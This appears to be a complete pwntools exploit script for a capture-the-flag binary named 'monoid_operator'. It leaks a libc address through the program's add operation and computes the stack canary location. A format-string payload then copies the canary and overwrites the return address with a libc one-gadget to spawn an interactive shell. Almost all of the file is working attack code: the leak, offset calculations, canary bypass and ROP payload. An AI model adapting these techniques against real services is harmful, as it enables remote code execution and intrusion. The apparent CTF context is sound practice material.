from pwn import *
import sys


def add(ints):
    io.sendafter(b'choose?\n', b'+')
    io.sendlineafter(b'input?\n', b'%d' % len(ints))

    ints = map(lambda i: b'%d' % i if isinstance(i, int) else b'-', ints)
    payload = b' '.join(ints)
    io.sendlineafter(b'integers.\n', payload)


def mul(ints):
    io.sendafter(b'choose?\n', b'*')
    io.sendlineafter(b'input?\n', b'%d' % len(ints))

    payload = b' '.join(map(lambda i: b'%d' % i, ints))
    io.sendlineafter(b'integers.\n', payload)


binpath = './monoid_operator_9092cbe0e255da46164bf38851880c1878ad3cbd'
libcpath = './libc.so.6_9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b'
ldpath = './ld-linux-x86-64.so.2_8233963009915cdf2380a13e4c3657429d51c8af'

elf = ELF(binpath)
libc = ELF(libcpath)


context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = 'DEBUG'


gdbscript = '''
gef
# before malloc
# b *(0x1464+0x555555554000)
# before result printf
# b *(0x1600+0x555555554000)
# before sprintf
# b *(0x1699+0x555555554000)
# error
# b *(0x163b+0x555555554000)
# just before returning
b *(0x16B8+0x555555554000)
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)


env = {"LD_PRELOAD": libcpath}
io = process([ldpath, binpath], env=env, stderr=sys.stderr)
# io = process(binpath)

ints = [10 for _ in range(0x418 // 8)]
mul(ints)

# offset_main_arena = 0x3ec5ac  # libc 2.27
offset_main_arena = 0x1e55ac
ints = [0] + [None for _ in range(0x418 // 8 - 1)]
add(ints)
io.recvuntil(b'The answer is ')
data = io.recvline().rstrip(b'\n.')
print(data)
addr_libc = int(data) - offset_main_arena
print("addr_libc = 0x{:x}".format(addr_libc))
# seems offset to canary depends whethere the running env is gdb or not
# addr_canary = addr_libc + 0x5f5528  # 2.27 gdb
# addr_canary = addr_libc + 0x5f9528  # 2.27 process
addr_canary = addr_libc + 0x1ec668  # 2.29 process
print("addr_canary = 0x{:x}".format(addr_canary))

# offset_gadgets = [324293, 324386, 1090444]  # 2.27
offset_gadgets = [926591, 926595, 926598, 1076984]  # 2.29

io.sendafter(b'choose?\n', b'q')
io.sendlineafter(b'name?\n', b'hoge')

payload = b''
# fill buffer to reach canary
payload += b'%1032c'
# insert NULL byte. stack canary always begins with NULL, which cannot be copied with %s.
# payload += b'%11$c'
payload += b'%8$c'
# copy rest of canary, by referring to pointer to canary on stack (which we will place below)
payload += b'%20$s'
payload += p64(addr_libc + offset_gadgets[1])
# pad
payload += b'A' * (0x18 - len(payload))
# place pointer to canary
# be careful that canary begins with \x00 so skip the first byte
payload += p64(addr_canary + 1)

io.sendafter(b'feed back!\n', payload)

io.interactive()
